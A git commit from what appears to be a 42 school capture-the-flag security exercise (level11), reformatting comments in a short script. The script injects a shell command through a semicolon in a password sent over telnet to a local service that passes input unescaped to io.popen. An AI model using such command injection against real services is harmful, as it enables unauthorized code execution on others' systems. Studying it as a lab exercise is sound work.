392ab92309e5a98b33dd7a6612f0425fe5e6b3d0
Alexandre BEAUVOIS <abeauvoi@student.42.fr>
2020-03-08 15:51:56 +0100

    fix layout

--- level11/Ressources/leak_telnet.sh
+++ level11/Ressources/leak_telnet.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
 # Here, we exploit the fact that the content of the string passed to io.popen isn't escaped.
-# So we can input a semi-colon into the password, and execute
-# arbitrary shell code.
+# So we can input a semi-colon into the password, and execute arbitrary shell code.
 echo ";getflag > /var/crash/flag11" | telnet localhost 5151
 cat /var/crash/flag11
